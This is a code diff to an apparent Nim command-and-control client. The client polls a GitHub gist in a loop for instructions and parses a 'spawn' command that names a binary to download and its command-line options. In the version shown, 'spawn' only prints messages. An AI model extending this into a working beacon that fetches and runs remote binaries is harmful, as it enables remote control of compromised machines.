@@ -3,29 +3,44 @@ import std/parseopt
 import std/strformat
 import std/strutils
 import std/uri
+import std/os
+import std/asyncdispatch
 
 var chan: Channel[string]
 
-proc parse_instruction(command: string, location: string, cmd_line: string) =
+proc parse_instruction(command: string, location: string, cmd_line: string): bool =
     case command:
     of "spawn":
         echo("Spawning binary")
         echo(&"downloading from this location {location}")
-        echo(&"Spawning with this command line options {cmd_line}")
+        echo(&"Spawning with these command line options {cmd_line}")
+        result = true
     else:
         echo("unknown command")
+        result = false
+    return result    
 
-proc help() =
-    echo(&"ERROR: --gist=USERNAME/GIST_ID needs to be a Valid HTTP/HTTPS gist endpoint")
-
-var get_instruction = proc(location: string) =
+proc get_instruction(location: string): Future[string] =
+    var aResult = newFuture[string]("get_instruction")
+    var client = newHttpClient()
     try:
-        var client = newHttpClient()
-        var res = getContent(client, location)
-        var command = res.split(" ")
-        parse_instruction(command[0], command[1], join(command[2..<command.len] , " "))
+        aResult.complete(getContent(client, location))
     except:
-        help()
+        aResult.fail(newException(OSError, "Error occured"))
+    client.close()
+    return aResult
+
+proc handle_loop(location: string, sleep_amount: int) {.async.} =
+    var sleep_time = sleep_amount * 1000
+    var last_instruction = ""
+    while true:
+        var res = await get_instruction(location)
+        if last_instruction != res:
+            last_instruction = res
+            var command = res.split(" ")
+            if command.len < 2 or not parse_instruction(command[0], command[1], join(command[2..<command.len] , " ")):
+                break
+        sleep(sleep_time)
 
 when isMainModule:
     var gist_location: string
@@ -48,7 +63,7 @@ when isMainModule:
                 if args.val != "":
                     sleep_time = args.val.parseInt()
         of cmdArgument:
-            help()
+            echo(&"ERROR: --gist=USERNAME/GIST_ID needs to be a Valid HTTP/HTTPS gist endpoint")
     if gist_location == "":
         gist_location = default_gist
-    get_instruction(gist_location)
+    waitFor handle_loop(gist_location, sleep_time)
